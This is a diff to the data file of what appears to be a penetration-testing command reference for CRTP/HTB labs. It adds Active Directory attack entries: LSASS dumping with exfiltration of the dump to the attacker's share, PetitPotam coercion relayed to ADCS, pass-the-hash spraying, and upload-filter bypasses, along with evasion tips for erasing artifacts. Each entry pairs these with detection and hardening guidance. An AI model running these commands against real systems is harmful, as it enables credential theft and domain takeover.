+        "secure_config": "# Remove dangerous ACEs using PowerView:\nRemove-DomainObjectAcl -TargetIdentity 'Domain Admins' \\\n    -PrincipalIdentity 'Domain Users' -Rights GenericWrite\n\n# Quarterly ACL audit script:\nGet-DomainObjectAcl -ResolveGUIDs | Where-Object {\n    $_.ActiveDirectoryRights -match 'GenericAll|WriteDACL|WriteOwner' -and\n    $_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'\n} | Export-Csv acl_audit_$(Get-Date -f yyyyMMdd).csv\n\n# Enable AD Recycle Bin and Protected Users group\n# Use Tiered Administration model to limit blast radius of any single compromise\n# Enable MDI (Microsoft Defender for Identity) — detects ACL abuse chains",
+        "evasion": "Make the DACL/attribute change, use it, then REVERT it (remove the added SPN/rights) to erase the persistence artifact; a single scoped edit is low-signal without object auditing."
       }
     },
     {
@@ -47324,6 +49508,115 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "crtp-lsass-minidump",
+      "name": "Offline LSASS Minidump -> Mimikatz (sekurlsa::minidump)",
+      "command": "mimikatz.exe \"sekurlsa::minidump <dump_file>\" \"sekurlsa::ekeys\" \"exit\"",
+      "description": "Dump LSASS memory on a target, exfiltrate the dump, and parse credentials/Kerberos keys offline - so Mimikatz never runs on the victim (evades on-host AV/EDR). In CRTP this extracts keys from a remote SQL box reached through linked-server xp_cmdshell, then runs sekurlsa::minidump on the collected dump.",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Lateral Movement",
+      "type": "command",
+      "certifications": [
+        "CRTP"
+      ],
+      "source": "CRTP",
+      "opsec": "loud",
+      "mitre": [
+        "T1003.001"
+      ],
+      "tools": [
+        "mimikatz",
+        "minidumpdotnet",
+        "Reverse.exe"
+      ],
+      "tags": [
+        "lsass-dump",
+        "minidump",
+        "credential-access",
+        "offline-parse",
+        "ekeys",
+        "crtp"
+      ],
+      "variations": [
+        {
+          "label": "Create the LSASS dump on the target (managed minidump)",
+          "command": "powershell -c \"<minidump_script> -pid (Get-Process lsass).Id -output <dump_file>\""
+        },
+        {
+          "label": "Un-reverse / repair a byte-reversed dump",
+          "command": "Reverse.exe \"<dump_file>\" \"<fixed_dump>\""
+        }
+      ],
+      "steps": [
+        {
+          "label": "Stage dumper to a share the target can read",
+          "command": "copy C:\\AD\\Tools\\minidumpdotnet.dll \\\\<share_host>\\<share>\ncopy C:\\AD\\Tools\\mini.ps1 \\\\<share_host>\\<share>"
+        },
+        {
+          "label": "Run the dumper on the target (here via linked-SQL xp_cmdshell)",
+          "command": "Get-SQLServerLinkCrawl -Instance <mssql> -Query 'exec master..xp_cmdshell ''powershell C:\\Users\\Public\\mini.ps1''' -QueryTarget <target>"
+        },
+        {
+          "label": "Exfil the dump back to your share",
+          "command": "Get-SQLServerLinkCrawl -Instance <mssql> -Query 'exec master..xp_cmdshell ''xcopy C:\\Users\\Public\\reverse.dmp \\\\<share_host>\\<share>\\'''"
+        },
+        {
+          "label": "Repair + parse offline",
+          "command": "Reverse.exe \"reverse.dmp\" \"reversex.dmp\"; mimikatz.exe \"sekurlsa::minidump reversex.dmp\" \"sekurlsa::ekeys\" \"exit\""
+        }
+      ],
+      "examples": [
+        {
+          "label": "Offline ekeys from a collected dump",
+          "command": "C:\\AD\\Tools\\mimikatz.exe \"sekurlsa::minidump C:\\AD\\Tools\\studentsharex\\reversex.dmp\" \"sekurlsa::ekeys\" \"exit\""
+        }
+      ],
+      "notes": "Dumping LSASS offline keeps Mimikatz off the victim - only a benign-looking .dll/.ps1 dumper runs there, and parsing happens on your box. sekurlsa::ekeys yields AES keys for overpass-the-hash (crtp-overpass-hash); logonpasswords yields NTLM/plaintext. The 'reverse' step un-mangles a dump that was byte-reversed for exfil. On-host alternative: crtp-credential-dumping (SafetyKatz evasive-keys). Requires SeDebugPrivilege / local admin on the target to read LSASS.",
+      "references": [
+        {
+          "title": "CRTP - Attacking and Defending AD (lab)",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "MITRE ATT&CK T1003.001 - LSASS Memory",
+          "url": "https://attack.mitre.org/techniques/T1003/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-mssql-links",
+          "note": "Linked-SQL xp_cmdshell is how the dumper reaches the deep host",
+          "rel": "prereq"
+        },
+        {
+          "id": "crtp-overpass-hash",
+          "note": "Use extracted AES keys for overpass-the-hash",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-credential-dumping",
+          "note": "On-host SafetyKatz alternative when EDR is weak",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "prerequisites": "Local admin / SeDebugPrivilege on the target to read LSASS. A path to run the dumper (linked SQL xp_cmdshell, PSRemoting, etc.) and a share to move the dump.",
+        "why_it_works": "LSASS holds cached credential material (NTLM hashes, Kerberos keys, sometimes plaintext). Any process with debug rights can snapshot LSASS memory to a file; because parsing happens elsewhere, no signatured credential tool executes on the victim, defeating on-host detection.",
+        "misconfiguration": "LSASS not protected (no RunAsPPL / Credential Guard); SeDebugPrivilege available to service/admin accounts; xp_cmdshell enabled on linked SQL servers; writable shares for exfil.",
+        "impact": "Recovery of NTLM hashes and Kerberos AES keys for privileged accounts -> overpass-the-hash, silver/golden tickets, lateral movement, and domain escalation.",
+        "detection": "Process opening a handle to lsass.exe with PROCESS_VM_READ/QueryInformation (Sysmon 10) from a non-security tool; creation of a .dmp file; large file copied to a share; xp_cmdshell spawning powershell; EDR LSASS-access alerts.",
+        "artifacts": "LSASS .dmp on disk / in a share; Sysmon 10 handle to lsass; SQL Agent/xp_cmdshell process tree; 5145 share write of a dump.",
+        "vulnerable_config": "# LSASS without RunAsPPL/Credential Guard\n# xp_cmdshell enabled on SQL and its links\n# Writable shares reachable by service accounts",
+        "secure_config": "# Enable LSASS RunAsPPL (RunAsPPL=1) and Credential Guard\n# Attack Surface Reduction: block credential stealing from LSASS\n# Disable xp_cmdshell; least-privilege SQL links\n# Restrict share write; monitor lsass handle opens",
+        "prevention": "Enable Credential Guard / RunAsPPL and ASR LSASS rule; disable xp_cmdshell; restrict debug privilege; alert on lsass handle access and .dmp creation. [MITRE M1043, M1040, M1026]",
+        "evasion": "Mimikatz never touches the victim (parse offline); use a managed/.NET minidumper instead of comsvcs; byte-reverse the dump for exfil to dodge content inspection; delete the dump after collection.",
+        "sources": [
+          "CRTP",
+          "MITRE T1003.001"
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -47355,14 +49648,9 @@ const COMMAND_DATA = {
       "command": "onesixtyone -c <community_wordlist> <ip>",
       "variations": [
         {
-          "description": "Brute community strings against single host",
-          "command": "onesixtyone -c <community_wordlist> <ip>",
-          "label": "onesixtyone (brute)"
-        },
-        {
           "description": "Sweep entire subnet with community wordlist",
           "command": "onesixtyone -c <community_wordlist> <cidr>",
-          "label": "onesixtyone (brute)"
+          "label": "Brute a CIDR range"
         },
         {
           "description": "Build minimal community list from defaults then sweep",
@@ -47372,12 +49660,12 @@ const COMMAND_DATA = {
         {
           "description": "Use SecLists SNMP community string wordlist",
           "command": "onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <ip>",
-          "label": "onesixtyone (brute)"
+          "label": "Brute one host (seclists)"
         },
         {
           "description": "Feed targets from file (hosts with UDP 161 open)",
           "command": "onesixtyone -c <community_wordlist> -i <targets_file>",
-          "label": "onesixtyone (brute)"
+          "label": "Brute a targets file"
         }
       ],
       "examples": [
@@ -47605,24 +49893,19 @@ const COMMAND_DATA = {
           "label": "pip3"
         },
         {
-          "description": "Export OpenVAS XML report to XLSX",
-          "command": "python3 -m openvasreporting -i <report>.xml -f xlsx",
-          "label": "python3 -m openvasreporting -i"
-        },
-        {
           "description": "Export to Word DOCX format",
           "command": "python3 -m openvasreporting -i <report>.xml -f docx",
-          "label": "python3 -m openvasreporting -i"
+          "label": "Export -> DOCX"
         },
         {
           "description": "Export multiple XML reports into one spreadsheet",
           "command": "python3 -m openvasreporting -i <report1>.xml <report2>.xml -f xlsx",
-          "label": "python3 -m openvasreporting -i"
+          "label": "Export -> XLSX (merge reports)"
         },
         {
           "description": "Filter by minimum severity (critical/high/medium/low)",
           "command": "python3 -m openvasreporting -i <report>.xml -f xlsx --min-lvl high",
-          "label": "python3 -m openvasreporting -i"
+          "label": "Export -> XLSX (high+ only)"
         },
         {
           "description": "Export from UI — XML format (for tool import)",
@@ -47737,11 +50020,6 @@ const COMMAND_DATA = {
           "description": "Install GVM/OpenVAS (Kali)",
           "command": "sudo apt-get update && sudo apt-get -y full-upgrade\nsudo apt-get install -y gvm",
           "label": "apt-get"
-        },
-        {
-          "description": "Run GVM setup (downloads NVT feed — takes 15-30 min first time)",
-          "command": "sudo gvm-setup",
-          "label": "sudo gvm-setup"
         },
         {
           "description": "Start GVM services",
@@ -47870,7 +50148,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.",
         "vulnerable_config": "# IPMI cipher 0 — no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data — auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS — version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
-        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)"
+        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
+        "evasion": "Enumerate SIDs sparingly; use valid creds where possible; avoid brute loops that trip account lockout."
       }
     },
     {
@@ -47911,10 +50190,6 @@ const COMMAND_DATA = {
         "credentials"
       ],
       "variations": [
-        {
-          "label": "Default (sysdba, put file)",
-          "command": "./odat.py utlfile -s <ip> -d <sid> -U <user> -P <password> --sysdba --putFile <remote_dir> <remote_filename> <file>"
-        },
         {
           "label": "Without sysdba (limited-priv account)",
           "command": "./odat.py utlfile -s <ip> -d <sid> -U <user> -P <password> --putFile <remote_dir> <remote_filename> <file>"
@@ -47990,7 +50265,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application allows file uploads but validates only the filename extension or MIME type on the client side (or uses a blocklist instead of allowlist). An attacker can bypass extension filters by double extensions (.php.jpg), null bytes, or case manipulation, and upload webshells that execute server-side code. The upload directory may also be within the web root and executable by the web server.",
         "vulnerable_config": "# PHP — blocklist validation (easily bypassed):\n$blocked = ['php', 'php3', 'php4', 'phtml'];\n$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);\nif (in_array(strtolower($ext), $blocked)) {\n    die('File type not allowed');\n}\nmove_uploaded_file($_FILES['file']['tmp_name'], '/var/www/html/uploads/' . $_FILES['file']['name']);\n# Bypass: upload shell.php5, shell.pHp, shell.php.jpg, shell.php%00.jpg\n# File lands in web root -> execute as PHP",
-        "secure_config": "# PHP — allowlist validation + store outside web root:\n$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];\n$allowed_exts  = ['jpg', 'jpeg', 'png', 'gif'];\n\n// Validate MIME type using fileinfo (server-side, not client-supplied):\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);\nif (!in_array($mime, $allowed_types)) { die('Invalid file type'); }\n\n$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));\nif (!in_array($ext, $allowed_exts)) { die('Invalid extension'); }\n\n// Store OUTSIDE web root with a random name:\n$dest = '/var/uploads/' . bin2hex(random_bytes(16)) . '.' . $ext;\nmove_uploaded_file($_FILES['file']['tmp_name'], $dest);\n\n// Serve via a download script (X-Accel-Redirect or readfile()) — not directly\n\n// nginx — disable script execution in upload directory:\nlocation /uploads/ {\n    location ~* \\.php$ { deny all; }\n}"
+        "secure_config": "# PHP — allowlist validation + store outside web root:\n$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];\n$allowed_exts  = ['jpg', 'jpeg', 'png', 'gif'];\n\n// Validate MIME type using fileinfo (server-side, not client-supplied):\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);\nif (!in_array($mime, $allowed_types)) { die('Invalid file type'); }\n\n$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));\nif (!in_array($ext, $allowed_exts)) { die('Invalid extension'); }\n\n// Store OUTSIDE web root with a random name:\n$dest = '/var/uploads/' . bin2hex(random_bytes(16)) . '.' . $ext;\nmove_uploaded_file($_FILES['file']['tmp_name'], $dest);\n\n// Serve via a download script (X-Accel-Redirect or readfile()) — not directly\n\n// nginx — disable script execution in upload directory:\nlocation /uploads/ {\n    location ~* \\.php$ { deny all; }\n}",
+        "code_review": "RED FLAGS (source): user input passed to include/require/file functions.\n  include($_GET['page'])  |  require($base.$user)  |  file_get_contents($_REQUEST['f'])  |  fopen($path)\nGREP:  grep -rniE \"(include|include_once|require|require_once|fopen|readfile|file_get_contents|file\\()\\s*\\(.*\\$_\" .\nSAFE:  allowlist map of includable pages (basename + whitelist), open_basedir, allow_url_include=Off, no user input in path."
       }
     },
     {
@@ -48259,6 +50535,142 @@ const COMMAND_DATA = {
       "exam": "exam-ok"
     },
     {
+      "id": "crtp-ou-gpo-enum",
+      "name": "OU & GPO Enumeration (PowerView)",
+      "command": "Get-DomainGPO | select displayname,gpcfilesyspath",
+      "description": "Map Organizational Units and the GPOs linked to them to find delegation and misconfigured policy that can be abused. PowerView resolves OU->gplink->GPO so you can see which computers a policy applies to and which GPO grants a foothold (e.g. a Restricted Group or a scheduled task).",
+      "platform": "windows",
+      "category": "Active Directory",
+      "subcategory": "Domain Enumeration",
+      "type": "command",
+      "certifications": [
+        "CRTP"
+      ],
+      "source": "CRTP",
+      "opsec": "quiet",
+      "mitre": [
+        "T1615",
+        "T1069.002"
+      ],
+      "tools": [
+        "PowerView"
+      ],
+      "tags": [
+        "gpo",
+        "ou",
+        "gplink",
+        "enumeration",
+        "powerview",
+        "crtp"
+      ],
+      "variations": [
+        {
+          "label": "List OUs",
+          "command": "Get-DomainOU | select -ExpandProperty name"
+        },
+        {
+          "label": "Computers inside a specific OU",
+          "command": "(Get-DomainOU -Identity <ou_name>).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name"
+        },
+        {
+          "label": "GPO linked to an OU (resolve gplink)",
+          "command": "Get-DomainGPO -Identity (Get-DomainOU -Identity <ou_name>).gplink.substring(11,(Get-DomainOU -Identity <ou_name>).gplink.length-72)"
+        },
+        {
+          "label": "GPO by friendly name",
+          "command": "Get-DomainGPO -Identity '<gpo_display_name>'"
+        },
+        {
+          "label": "GPO-granted local admin (Restricted Groups)",
+          "command": "Get-DomainGPOLocalGroup"
+        },
+        {
+          "label": "Where a user/group is local admin via GPO",
+          "command": "Get-DomainGPOUserLocalGroupMapping -Identity <user> -Verbose"
+        },
+        {
+          "label": "gpresult /r - applied GPOs on this host",
+          "command": "gpresult /r"
+        },
+        {
+          "label": "gpresult /z - verbose applied GPOs",
+          "command": "gpresult /z"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Enumerate OUs",
+          "command": "Get-DomainOU | select -ExpandProperty name"
+        },
+        {
+          "label": "See which GPO is linked to the OU",
+          "command": "(Get-DomainOU -Identity DevOps).gplink"
+        },
+        {
+          "label": "Resolve the GPO details",
+          "command": "Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'"
+        },
+        {
+          "label": "Find who can edit GPOs (abuse path)",
+          "command": "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl'}"
+        }
+      ],
+      "examples": [
+        {
+          "label": "OU -> computers (DevOps)",
+          "command": "(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name"
+        },
+        {
+          "label": "GPO by name (DevOps Policy)",
+          "command": "Get-DomainGPO -Identity 'DevOps Policy'"
+        }
+      ],
+      "notes": "OU/GPO mapping is the recon step before GPO abuse: find an OU you can influence, the GPO linked to it, and the computers in scope. gpcfilesyspath points to the SYSVOL folder holding the policy files. Follow with crtp-gpo-abuse to weaponize write access to a linked GPO.",
+      "references": [
+        {
+          "title": "CRTP - Attacking and Defending AD (lab)",
+          "url": "https://www.alteredsecurity.com/adlab"
+        },
+        {
+          "title": "PowerSploit/PowerView",
+          "url": "https://powersploit.readthedocs.io/en/latest/Recon/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-powerview-acls",
+          "note": "Find who has write rights over the GPO/OU",
+          "rel": "prereq"
+        },
+        {
+          "id": "crtp-gpo-abuse",
+          "note": "Weaponize write access to a linked GPO",
+          "rel": "next"
+        },
+        {
+          "id": "crtp-powerview-domain",
+          "note": "Broader domain enumeration context",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "prerequisites": "Any authenticated domain user (OU/GPO objects and gplink attributes are world-readable in AD).",
+        "why_it_works": "OU structure, GPO objects, and gplink relationships are stored as readable directory attributes; combined with default DACL readability, any user can reconstruct which policies apply where and which principals can edit them.",
+        "misconfiguration": "Non-privileged principals granted Write/WriteDacl on GPO objects or link permissions on OUs; overly broad delegation; SYSVOL policy paths readable/writable beyond admins.",
+        "impact": "Reveals GPO-based privilege-escalation and lateral-movement paths (editable GPO linked to servers/DCs) - the map for a domain-wide compromise via GPO abuse.",
+        "detection": "LDAP queries enumerating groupPolicyContainer and organizationalUnit objects with gplink; unusual read volume against the Policies container; BloodHound-style collection patterns.",
+        "artifacts": "Directory service access logs (4662) for GPO/OU objects; SYSVOL access spikes.",
+        "vulnerable_config": "# Non-admins with WriteProperty/WriteDacl on GPO objects\n# OU delegation granting link/edit to helpdesk or app teams",
+        "secure_config": "# Restrict GPO edit rights to a small admin group; audit GPO DACLs\n# Remove unnecessary OU delegation; monitor gplink changes\n# Enable AD object-access auditing (4662) on Policies container",
+        "prevention": "Audit and minimize GPO/OU delegation; restrict WriteDacl/WriteProperty on GPOs to admins; monitor GPO/gplink changes and SYSVOL edits. [MITRE M1018, M1026]",
+        "evasion": "Read-only LDAP enumeration blends with normal management traffic; scope queries to a single OU to reduce volume.",
+        "sources": [
+          "CRTP",
+          "MITRE T1615"
+        ]
+      }
+    },
+    {
       "id": "crtp-overpass-hash",
       "name": "Overpass-the-Hash / Pass-the-Key (Rubeus asktgt)",
       "command": "Rubeus.exe asktgt /user:<user> /rc4:<nt_hash> /domain:<domain> /ptt /opsec",
@@ -48338,7 +50750,7 @@ const COMMAND_DATA = {
           "rel": "alternative"
         }
       ],
-      "notes": "/opsec generates RC4 AS-REQ but uses AES for the session key — less suspicious. Prefer AES key if available.",
+      "notes": "/opsec generates RC4 AS-REQ but uses AES for the session key — less suspicious. Prefer AES key if available. runas /netonly starts a process whose network auth uses the supplied account without validating it locally - handy to use captured plaintext/NTLM before/instead of a forged TGT.",
       "references": [
         {
           "title": "CRTP - Overpass the Hash",
@@ -48364,7 +50776,13 @@ const COMMAND_DATA = {
         "misconfiguration": "Credential Guard not enabled. Protected Users group not used for DA accounts. RC4 encryption not restricted. No monitoring of DA account TGT requests from unexpected sources. LSASS PPL disabled (allows hash extraction prerequisite).",
         "vulnerable_config": "# Credential Guard NOT enabled:\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard').EnableVirtualizationBasedSecurity\n# Returns 0 or $null = VBS/Credential Guard disabled = NTLM hashes extractable from LSASS\n\n# Protected Users NOT used for DAs:\nGet-ADGroupMember 'Protected Users' | Select-Object Name\n# DA accounts not in Protected Users → NTLM hashes delegatable",
         "secure_config": "# Enable Credential Guard:\n# Computer Config → Admin Templates → System → Device Guard\n# → Turn On Virtualization Based Security: Enabled\n# → Credential Guard Configuration: Enabled with UEFI lock\n\n# Add all DA accounts to Protected Users:\nGet-ADGroupMember 'Domain Admins' | ForEach-Object {\n  Add-ADGroupMember 'Protected Users' $_.distinguishedName\n}\n# Protected Users: no NTLM, no RC4 Kerberos, no delegation, no cached creds\n\n# Force AES-only Kerberos for sensitive accounts:\nSet-ADUser DomainAdmin1 -KerberosEncryptionType AES256\n\n# SIEM alert:\n# EventID=4768 AND TicketOptions=0x40800010 (forwardable+renewable+canonicalize)\n# AND ServiceName=krbtgt AND ClientAddress NOT IN (known PAW IPs for DA) → ALERT"
-      }
+      },
+      "variations": [
+        {
+          "label": "runas /netonly (inject creds into a new logon session)",
+          "command": "runas /user:<domain>\\<user> /netonly cmd"
+        }
+      ]
     },
     {
       "id": "api-security-top10-ref",
@@ -48447,17 +50865,17 @@ const COMMAND_DATA = {
         {
           "command": "smbclient \\\\\\\\<target>\\\\<share> -U <domain>/<user> --pw-nt-hash <nt_hash> -c 'ls'",
           "caption": "Non-interactive: list share contents",
-          "label": "smbclient \\\\\\\\<target>\\\\<share> -U…"
+          "label": "smbclient (hash) - list"
         },
         {
           "command": "smbclient \\\\\\\\<target>\\\\<share> -U <user> --pw-nt-hash <nt_hash> -c 'get <file>'",
           "caption": "Download a specific file",
-          "label": "smbclient \\\\\\\\<target>\\\\<share> -U…"
+          "label": "smbclient (hash) - download"
         },
         {
           "command": "smbclient \\\\\\\\<target>\\\\<share> -U <user> --pw-nt-hash <nt_hash> -c 'put <local_file> <remote_file>'",
           "caption": "Upload a file to the share",
-          "label": "smbclient \\\\\\\\<target>\\\\<share> -U…"
+          "label": "smbclient (hash) - upload"
         },
         {
           "command": "impacket-psexec -hashes :<nt_hash> <user>@<target>",
@@ -48472,12 +50890,12 @@ const COMMAND_DATA = {
         {
           "command": "crackmapexec smb <target> -u <user> -H <nt_hash> --shares",
           "caption": "CrackMapExec PTH: enumerate all accessible shares",
-          "label": "crackmapexec"
+          "label": "cme (hash) - enum shares"
         },
         {
           "command": "crackmapexec smb <cidr> -u <user> -H <nt_hash> -x 'whoami'",
           "caption": "CrackMapExec PTH: spray hash across subnet and run command",
-          "label": "crackmapexec"
+          "label": "cme (hash) - exec on CIDR"
         }
       ],
       "examples": [
@@ -48647,7 +51065,7 @@ const COMMAND_DATA = {
     {
       "id": "pcredz-pcap",
       "name": "Pcredz - Extract Credentials from Traffic",
-      "command": "./Pcredz -f <capture.pcap> -t -v",
+      "command": "./Pcredz -f <pcap_file> -t -v",
       "description": "Parses a packet capture (or live interface) to pull credentials from cleartext and challenge/response protocols: HTTP basic/NTLM, FTP, SMTP/POP/IMAP, SNMP strings, and NTLMv1/v2 and Kerberos hashes. Look for cleartext protocols like HTTP, FTP, and LDAP.",
       "platform": "linux",
       "requires": [
@@ -48863,6 +51281,26 @@ const COMMAND_DATA = {
       "tools": [
         "PetitPotam",
         "impacket"
+      ],
+      "variations": [
+        {
+          "label": "Coerce to an ADCS relay (ESC8)",
+          "command": "sudo ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Start the relay to ADCS web enrollment",
+          "command": "sudo ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+        },
+        {
+          "label": "Coerce the DC to authenticate (PetitPotam)",
+          "command": "python3 PetitPotam.py <attacker_ip> <dc_ip>"
+        },
+        {
+          "label": "Use the captured DC cert for a TGT (PKINIT)",
+          "command": "python3 gettgtpkinit.py -pfx-base64 <b64> <domain>/<dc_name>\\$ dc.ccache"
+        }
       ]
     },
     {
@@ -48947,7 +51385,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application allows file uploads but validates only the filename extension or MIME type on the client side (or uses a blocklist instead of allowlist). An attacker can bypass extension filters by double extensions (.php.jpg), null bytes, or case manipulation, and upload webshells that execute server-side code. The upload directory may also be within the web root and executable by the web server.",
         "vulnerable_config": "# PHP — blocklist validation (easily bypassed):\n$blocked = ['php', 'php3', 'php4', 'phtml'];\n$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);\nif (in_array(strtolower($ext), $blocked)) {\n    die('File type not allowed');\n}\nmove_uploaded_file($_FILES['file']['tmp_name'], '/var/www/html/uploads/' . $_FILES['file']['name']);\n# Bypass: upload shell.php5, shell.pHp, shell.php.jpg, shell.php%00.jpg\n# File lands in web root -> execute as PHP",
-        "secure_config": "# PHP — allowlist validation + store outside web root:\n$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];\n$allowed_exts  = ['jpg', 'jpeg', 'png', 'gif'];\n\n// Validate MIME type using fileinfo (server-side, not client-supplied):\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);\nif (!in_array($mime, $allowed_types)) { die('Invalid file type'); }\n\n$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));\nif (!in_array($ext, $allowed_exts)) { die('Invalid extension'); }\n\n// Store OUTSIDE web root with a random name:\n$dest = '/var/uploads/' . bin2hex(random_bytes(16)) . '.' . $ext;\nmove_uploaded_file($_FILES['file']['tmp_name'], $dest);\n\n// Serve via a download script (X-Accel-Redirect or readfile()) — not directly\n\n// nginx — disable script execution in upload directory:\nlocation /uploads/ {\n    location ~* \\.php$ { deny all; }\n}"
+        "secure_config": "# PHP — allowlist validation + store outside web root:\n$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];\n$allowed_exts  = ['jpg', 'jpeg', 'png', 'gif'];\n\n// Validate MIME type using fileinfo (server-side, not client-supplied):\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);\nif (!in_array($mime, $allowed_types)) { die('Invalid file type'); }\n\n$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));\nif (!in_array($ext, $allowed_exts)) { die('Invalid extension'); }\n\n// Store OUTSIDE web root with a random name:\n$dest = '/var/uploads/' . bin2hex(random_bytes(16)) . '.' . $ext;\nmove_uploaded_file($_FILES['file']['tmp_name'], $dest);\n\n// Serve via a download script (X-Accel-Redirect or readfile()) — not directly\n\n// nginx — disable script execution in upload directory:\nlocation /uploads/ {\n    location ~* \\.php$ { deny all; }\n}",
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
       },
       "variations": [
         {
@@ -49068,7 +51507,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1552.001",
           "MITRE T1555"
-        ]
+        ],
+        "evasion": "Collect only the files you need and pull them over an existing channel; avoid staging large toolsets on the host; delete anything you drop."
       }
     },
     {
@@ -49172,7 +51612,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1003.002",
           "MITRE T1552.001"
-        ]
+        ],
+        "evasion": "Collect only the files you need and pull them over an existing channel; avoid staging large toolsets on the host; delete anything you drop."
       }
     },
     {
@@ -49262,7 +51703,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1003.003",
           "MITRE T1048"
-        ]
+        ],
+        "evasion": "Collect only the files you need and pull them over an existing channel; avoid staging large toolsets on the host; delete anything you drop."
       }
     },
     {
@@ -49357,7 +51799,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1539",
           "MITRE T1552"
-        ]
+        ],
+        "evasion": "Collect only the files you need and pull them over an existing channel; avoid staging large toolsets on the host; delete anything you drop."
       }
     },
     {
@@ -49416,10 +51859,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Linux",
-          "command": "for i in {1..254}; do (ping -c 1 172.16.5.$i | grep \"bytes from\" &); done"
-        },
-        {
           "label": "Windows CMD",
           "command": "for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find \"Reply\""
         },
@@ -49461,6 +51900,121 @@ const COMMAND_DATA = {
